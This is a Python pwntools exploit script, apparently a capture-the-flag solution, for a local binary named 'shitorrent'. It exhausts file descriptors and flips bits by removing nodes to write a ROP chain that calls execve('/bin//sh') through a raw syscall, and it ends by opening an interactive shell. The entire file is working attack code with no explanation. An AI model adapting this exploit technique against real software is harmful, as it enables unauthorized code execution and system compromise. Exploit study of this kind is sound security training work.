#!/usr/bin/env python3

from pwn import *
import time, sys

NORMAL_SERVICE_PORT = 10001
ADMIN_SERVICE_PORT = 10002
REST_QUANT=0.04

p = process('./shitorrent')


def add_node(host, port):
    global p
    msg = p.recvuntil('rrent')
    if b"Failed" in msg or b"not" in msg:
        print ("Failed....{}".format(msg))
        p.close()
        sys.exit()
    p.recvuntil('et flag')
    p.sendline('a')
    p.recvuntil('enter host')
    p.send(host.ljust(99, "\x00"))
    p.recvuntil('enter port')
    p.send(str(port).ljust(9, "\x00"))

def add_normal():
    add_node("127.0.0.1", NORMAL_SERVICE_PORT)
def add_admin():
    add_node("127.0.0.1", ADMIN_SERVICE_PORT)

def remove_node(fd):
    # print ("remove_node({})".format(fd))
    global p
    p.recvuntil('et flag')
    p.sendline('r')
    p.send(str(fd).ljust(255, "\x00"))

fd = 1216
rop = [
  0x0000000000407888, # pop rsi ; ret
  0x00000000006da0e0, # @ .data
  0x00000000004657fc, # pop rax ; ret
  u64(b'/bin//sh'),
  0x00000000004055c1, # mov qword ptr [rsi], rax ; ret
  0x0000000000407888, # pop rsi ; ret
  0x00000000006da0e8, # @ .data + 8
  0x0000000000460b90, # xor rax, rax ; ret
  0x00000000004055c1, # mov qword ptr [rsi], rax ; ret
  0x0000000000400706, # pop rdi ; ret
  0x00000000006da0e0, # @ .data
  0x0000000000407888, # pop rsi ; ret
  0x00000000006da0e8, # @ .data + 8
  0x0000000000465855, # pop rdx ; ret
  0x00000000006da0e8, # @ .data + 8
  0x00000000004657fc, # pop rax ; ret
  0x3b,
  0x0000000000490ec5, # syscall
  0xdeaddeadbeef
]


print ("start attach padding")
for i in range(3, 1216):
    if i % 101 == 100:
        print ("padding progress .... [{}/{}]".format(i, 1216))
    sleep(REST_QUANT)
    # print ("add normal {}".format(i))
    add_normal()

print("start to fill")
for i in range(0, 64 * len(rop)):
    if i % 101 == 100:
        print ("Fill bit progress .... [{}/{}]".format(i, 64*len(rop)))
    sleep(REST_QUANT)
    # print ("add admin {}".format(i))
    add_admin()

print ("Filling finished!")
print (p.recvuntil("et flag"))
p.sendline("g")
print (p.recvuntil("kidding"))
#input("#")
print("removing...")
for i, word in enumerate(rop):
    binary = bin(word)[2:].rjust(64, '0')[::-1]
    print (hex(word) + ": " + binary)
    print ("Removing.... [{}/{}]".format(i, len(rop)))
    for bit in binary:
        if bit == '0':
            sleep(REST_QUANT)
            remove_node(fd)
        fd=fd+1
    #input('#')

p.recvuntil('et flag')
p.sendline('q')
print("Execute shell!")
p.interactive()
p.close()